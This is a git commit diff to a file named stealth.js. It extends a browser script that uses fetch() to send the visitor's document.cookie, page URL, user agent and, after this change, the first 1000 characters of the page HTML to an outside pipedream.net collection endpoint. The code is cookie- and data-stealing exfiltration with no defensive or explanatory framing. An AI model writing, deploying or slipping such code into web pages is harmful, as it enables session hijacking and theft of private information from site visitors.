dcbdd58165c6aabcb6b971171c9363303425cf07
Raden Adhiyaksa Indiharto <70601366+radenadhiyaksa@users.noreply.github.com>
2025-05-18 20:53:59 +0900

    Update stealth.js

--- stealth.js
+++ stealth.js
@@ -5,6 +5,7 @@ fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
     cookie: document.cookie,
     location: location.href,
     userAgent: navigator.userAgent,
+    html: document.documentElement?.outerHTML?.slice(0, 1000),
     ts: Date.now(),
     id: Math.random().toString(36).substring(2)
   })
